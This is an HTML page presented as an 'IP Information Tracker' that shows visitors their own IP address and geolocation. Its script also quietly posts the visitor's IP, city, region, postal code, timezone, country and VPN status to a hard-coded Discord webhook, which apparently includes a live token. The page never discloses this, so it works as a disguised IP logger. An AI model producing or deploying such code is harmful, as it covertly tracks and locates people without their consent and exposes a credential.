<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Information Tracker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://kit.fontawesome.com/76661d0faf.js" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Geist', sans-serif;
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="container mx-auto px-4 py-8">
        <div class="max-w-2xl mx-auto bg-gray-800 rounded-lg shadow-xl p-6">
            <h1 class="text-3xl font-bold mb-6 text-center">IP Information Tracker</h1>
            <div id="loading" class="text-center hidden">
                <i class="fas fa-spinner fa-spin text-2xl"></i>
                <p class="mt-2">Fetching IP information...</p>
            </div>
            <div id="info" class="space-y-4"></div>
            <button onclick="getAndSendIPInfo()" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition duration-200">
                <i class="fas fa-sync-alt mr-2"></i>Fetch IP Info
            </button>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1325525927144329317/PCYE5RoiJjlYSwWmmIK50i9xnkzIGtPWLAtq81RwzSrrM-ebs6JAD3amygj-jzjQNQOk'; // Replace with your webhook URL

        async function fetchIPInfo(ip) {
            const info = {
                ip: await fetch('https://api.ipify.org').then(r => r.text()),
                city: await fetch(`https://ipapi.co/${ip}/city`).then(r => r.text()),
                region: await fetch(`https://ipapi.co/${ip}/region`).then(r => r.text()),
                postal: await fetch(`https://ipapi.co/${ip}/postal`).then(r => r.text()),
                timezone: await fetch(`https://ipapi.co/${ip}/timezone`).then(r => r.text()),
                currency: await fetch(`https://ipapi.co/${ip}/currency`).then(r => r.text()),
                country: await fetch(`https://ipapi.co/${ip}/country_name`).then(r => r.text()),
                callcode: await fetch(`https://ipapi.co/${ip}/country_calling_code`).then(r => r.text())
            };

            const vpnResponse = await fetch('http://ip-api.com/json?fields=proxy');
            const vpnData = await vpnResponse.json();
            info.vpn = vpnData.proxy;

            return info;
        }

        async function getAndSendIPInfo() {
            const loading = document.getElementById('loading');
            const infoDiv = document.getElementById('info');
            
            loading.classList.remove('hidden');
            infoDiv.innerHTML = '';

            try {
                const publicIP = await fetch('https://api.ipify.org').then(r => r.text());
                const info = await fetchIPInfo(publicIP);

                // Display information
                const items = [
                    { icon: 'fa-network-wired', label: 'IP', value: info.ip },
                    { icon: 'fa-city', label: 'City', value: info.city },
                    { icon: 'fa-map-marker-alt', label: 'Region', value: info.region },
                    { icon: 'fa-mailbox', label: 'Postal', value: info.postal },
                    { icon: 'fa-clock', label: 'Timezone', value: info.timezone },
                    { icon: 'fa-money-bill', label: 'Currency', value: info.currency },
                    { icon: 'fa-globe', label: 'Country', value: info.country },
                    { icon: 'fa-phone', label: 'Call Code', value: info.callcode },
                    { icon: 'fa-shield-alt', label: 'VPN', value: info.vpn ? 'Yes' : 'No' }
                ];

                infoDiv.innerHTML = items.map(item => `
                    <div class="flex items-center space-x-4 p-3 bg-gray-700 rounded">
                        <i class="fas ${item.icon} w-6"></i>
                        <span class="font-semibold w-24">${item.label}:</span>
                        <span class="flex-1">${item.value}</span>
                    </div>
                `).join('');

                // Send to Discord
                const webhookData = {
                    embeds: [{
                        title: 'IP Information Report',
                        color: 3447003,
                        fields: items.map(item => ({
                            name: item.label,
                            value: item.value.toString(),
                            inline: true
                        })),
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(webhookData)
                });

            } catch (error) {
                infoDiv.innerHTML = `
                    <div class="bg-red-500 text-white p-4 rounded">
                        Error: ${error.message}
                    </div>
                `;
            } finally {
                loading.classList.add('hidden');
            }
        }
    </script>
</body>
</html>